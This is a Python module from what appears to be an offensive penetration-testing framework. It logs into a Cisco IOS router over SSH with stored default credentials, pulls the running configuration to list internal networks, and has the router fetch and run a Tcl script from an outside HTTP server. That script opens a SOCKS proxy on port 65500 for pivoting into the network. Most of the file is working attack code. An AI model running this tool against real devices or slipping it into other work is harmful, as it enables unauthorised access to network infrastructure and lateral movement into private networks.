import ipaddress
import asyncio
import socket
import netdev

from pathlib import Path
from src.core.base.BaseModule import BaseModule
from src.core.registry.ModuleRegistry import ModuleRegistry
from src.core.registry.OptionRegistry import OptionRegistry
from prompt_toolkit.shortcuts import PromptSession
from prompt_toolkit.styles import Style

prompt_style = Style.from_dict({"prompt": "ansired bold"})


class ProxyModule(BaseModule):

    helper = {
        'name': 'socks_proxy',
        'help': 'This module will setup a SOCKS4a proxy into Cisco network',
        'usage': 'use socks_proxy'
    }

    options = {
        'module': {
            'host': [
                '10.10.10.3',
                'The IPv4 Address of the Cisco SSH service',
                ''
            ],
            'port': [
                '22',
                'The port number of the Cisco SSH service',
                ''
            ],
            'username': [
                'bob',
                'The username of the Cisco SSH service',
                ''
            ],
            'password': [
                'itsbob',
                'The password of the Cisco SSH server',
                ''
            ],
            'secret': [
                'golgo13golgo',
                'The secret password of the Cisco SSH server',
                ''
            ],
            'endpoint': [
                'http://10.10.10.1:8080/proxy.tcl',
                'The HTTP file server endpoint to use',
                ''
            ]
        }
    }

    def __init__(self, command: str, print_queue: asyncio.Queue, console: object):
        super().__init__()
        self.command: str = command
        self.console: object = console
        self.print_queue: asyncio.Queue = print_queue
        self.module_register: ModuleRegistry = ModuleRegistry()
        self.option_register: OptionRegistry = OptionRegistry()
        self.work_queue: asyncio.Queue = asyncio.Queue()
        self.networks: list = []

    async def main(self) -> None:
        await self.register()
        await self.module_shell()

    @staticmethod
    def return_list_from_file(filename: str) -> list:
        if filename == '':
            return []
        return [x.rstrip() for x in open(filename, encoding='utf8')] if Path(filename).is_file() else [filename]

    async def register(self) -> None:
        self.option_register.register_options(options=self.options)

    async def module_shell(self) -> None:
        session = PromptSession()
        allowed_commands = ['set', 'options', 'run', 'back']
        while True:
            try:
                prompt_text = self.option_register.get_register_value('prompt')
                sub_prompt = f"{prompt_text} [{self.helper['name']}]> "
                data: str = await session.prompt_async(sub_prompt, style=prompt_style)
                if not data or not data.startswith(tuple(allowed_commands)):
                    continue
                if data.startswith(tuple(['back', 'exit'])):
                    raise EOFError
                if data.startswith(tuple(['set', 'options'])):
                    # noinspection PyUnresolvedReferences
                    await self.console.command_interpreter(data)
                if data.startswith(tuple(['run', 'exploit'])):
                    await asyncio.create_task(self.execute())
            except (EOFError, KeyboardInterrupt):
                await self.unregister()
                break

    async def unregister(self) -> None:
        options: dict = self.option_register.get_register_dict()
        if 'module' in options.keys():
            options.pop('module')
            self.option_register.register_options(options)

    @staticmethod
    async def get_version(ios: netdev.vendors.CiscoIOS) -> str:
        output: str = await ios.send_command('sh ver')
        return output

    @staticmethod
    async def get_running_configuration(ios: netdev.vendors.CiscoIOS) -> str:
        output = await ios.send_command('sh run', strip_command=True, strip_prompt=True)
        return output if output else ""

    @staticmethod
    async def netmask_to_cidr(netmask: str) -> str:
        return str(ipaddress.IPv4Network(f'0.0.0.0/{netmask}').prefixlen)

    @staticmethod
    async def get_subnet_chunks(size: int, network: ipaddress.IPv4Network) -> list:
        return list(network.subnets(prefixlen_diff=size))

    async def get_interfaces(self, ios: netdev.vendors.CiscoIOS):
        ifaces = []
        output = await self.get_running_configuration(ios)
        output.replace('\r\n', '\n')
        [ifaces.append(x.split(' ')[1]) for x in output.split('\n') if x.strip().startswith('interface')]
        return ifaces

    async def get_networks(self, host: str, ios: netdev.vendors.CiscoIOS) -> list:
        networks = []
        output = await self.get_running_configuration(ios)
        output.replace('\r\n', '\n')
        for x in output.split('\n'):
            if x.strip().startswith('ip address'):
                net = x.strip().split(' ')
                if len(net) != 4:
                    continue
                network = f'{net[2]}/{await self.netmask_to_cidr(net[3])}'
                if ipaddress.ip_address(host) in ipaddress.ip_network(network, False):
                    continue
                networks.append(network)
        return networks

    @staticmethod
    async def setup_proxy(ios: netdev.vendors.CiscoIOS, endpoint: str) -> bool:
        output = await ios.send_command(f'tclsh {endpoint} -D 65500')
        if '%' in output:
            return False
        return True

    async def execute(self) -> None:
        host: str = self.option_register.get_register_value('host')
        port: str = self.option_register.get_register_value('port')
        username: str = self.option_register.get_register_value('username')
        password: str = self.option_register.get_register_value('password')
        secret: str = self.option_register.get_register_value('secret')
        endpoint: str = self.option_register.get_register_value('endpoint')

        device: dict = {
            'host': host,
            'port': port,
            'username': username,
            'password': password,
            'secret': secret,
            'device_type': 'cisco_ios'
        }

        try:
            async with netdev.create(**device) as ios:
                self.networks = await self.get_networks(host, ios)
                await self.setup_proxy(ios, endpoint)
        except netdev.DisconnectError as e:
            await self.print_queue.put(f"[Disconnect Error] - {e.__str__()}\n")
            return
        except netdev.TimeoutError:
            a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            location = (f"{host}", int(port))
            result_of_check = a_socket.connect_ex(location)
            if result_of_check == 0:
                await self.print_queue.put(f"\n[SOCKS Proxy established on host {host} running on port 65500]\n")
                if len(self.networks) > 0:
                    await self.print_queue.put(f"[The following networks were discovered within IOS configuration]")
                    await self.print_queue.put(f", ".join(self.networks))
                await self.print_queue.put("")
            else:
                await self.print_queue.put(f"[Timeout Error] - Connection timed out during Proxy setup\n")
            return
        except Exception as e:
            await self.print_queue.put(f"[Uncaught Error] - {e.__str__()}\n")
            return
